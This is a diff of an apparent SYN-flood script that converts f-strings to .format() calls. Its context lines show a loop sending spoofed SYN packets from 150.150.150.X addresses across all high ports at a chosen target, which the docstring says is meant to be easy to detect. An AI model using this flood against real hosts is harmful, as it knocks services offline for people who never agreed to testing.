@@ -3,7 +3,6 @@
 """
 Attacks wil originate from an address that looks like this 150.150.150.X to make it easily detected and blocked. 
 X will go from 1 to 254. 
-
 Usage:
   ezSYN_FLOOD.py <dst_ip> <dst_port> [--sleep=<sec>] [--verbose] [--very-verbose]
 Options:
@@ -33,16 +32,16 @@ def main(arguments):
 
     print("\n###########################################")
     print("# Starting SYN TCP flood...")
-    print(f"# Shooting at: {dst_ip}")
+    print("# Shooting at: {dst_ip}".format(dst_ip=dst_ip))
     print("###########################################\n")
     for src_host in range(1,254):
         if verbose or very_verbose:
-            print(f"[*] We are sending spoofed SYN packets from {src_net}{src_host}")
+            print("[*] We are sending spoofed SYN packets from {src_net}{src_host}".format(src_net=src_net,src_host=src_host))
             print("--------------------------------------------")
 
         for src_port in range(1024, 65535):
             if very_verbose:
-                print(f"[+] Sending a spoofed SYN packet from {src_net}{src_host}:{src_port}")
+                print("[+] Sending a spoofed SYN packet from {src_net}{src_host}:{src_port}".format(src_net=src_net,src_host=src_host,src_port=src_port))
 
             # Build the packet
             src_ip = src_net + str(src_host)
